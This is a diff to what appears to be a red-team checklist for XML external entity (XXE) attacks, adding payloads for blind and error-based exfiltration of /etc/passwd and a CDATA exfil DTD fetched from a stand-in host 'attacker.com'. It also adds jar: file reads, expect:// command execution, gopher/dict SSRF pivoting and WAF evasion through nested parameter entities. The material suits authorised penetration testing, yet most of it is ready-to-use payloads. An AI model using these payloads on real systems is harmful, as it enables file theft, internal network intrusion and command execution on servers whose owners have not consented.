@@ -68,6 +68,9 @@ origin: RedteamOpencode
       ```
 - [ ] Error-based exfiltration: force parse error containing file data
 - [ ] FTP-based exfiltration for multi-line files
+- [ ] Blind XXE without outbound access (egress-filtered targets): reuse a DTD already present on the local filesystem instead of fetching one — e.g. `<!DOCTYPE foo [ <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local; ]>` (or any known-present local DTD) to trigger a parameter-entity redefinition that leaks data via an in-band parse error, no OOB channel required
+- [ ] Error-based exfil via `SYSTEM` + malformed URI to force a parser error whose message embeds the file content: `<!ENTITY % file SYSTEM "file:///nonexistent/../../etc/passwd"><!ENTITY % error "<!DOCTYPE r [<!ENTITY % file SYSTEM 'file:///etc/passwd'>%file;]>">%error;`
+- [ ] CDATA-wrapped exfil DTD for binary/special-character files that would otherwise break the outer XML: `<!ENTITY % start "<![CDATA["> <!ENTITY % goodies SYSTEM "file:///etc/passwd"> <!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd"> %dtd;`
 
 ### 5. Denial of Service
 
@@ -84,10 +87,14 @@ origin: RedteamOpencode
 
 - [ ] UTF-16 encoding: `<?xml version="1.0" encoding="UTF-16"?>`
 - [ ] CDATA wrapping to exfiltrate XML-breaking characters
-- [ ] XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`
+- [ ] XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>` — useful when only a fragment of XML is user-controlled (no `<!DOCTYPE>` access) since XInclude doesn't require a DOCTYPE declaration
 - [ ] HTML entities instead of XML entities
 - [ ] Content-Type switch: JSON → XML if parser auto-detects
 - [ ] Nested ENTITY definitions to evade WAF patterns
+- [ ] Java `jar:` protocol to read a specific file inside a ZIP/JAR without extracting it: `<!ENTITY xxe SYSTEM "jar:file:///path/to/upload.zip!/target.xml">`
+- [ ] `expect://` wrapper (PHP with the `expect` extension enabled) for direct command execution rather than file read: `<!ENTITY xxe SYSTEM "expect://id">`
+- [ ] `netdoc://` (older Java) and `gopher://`/`dict://` protocol handlers for SSRF pivoting to non-HTTP internal services when the parser's protocol allowlist is loose
+- [ ] Parameter-entity nesting to smuggle payloads past naive string-match WAFs that only look for `<!ENTITY` at the top level: define the malicious entity inside a second-level DTD referenced only through a parameter entity chain
 
 ### 7. SVG / Office File XXE
 
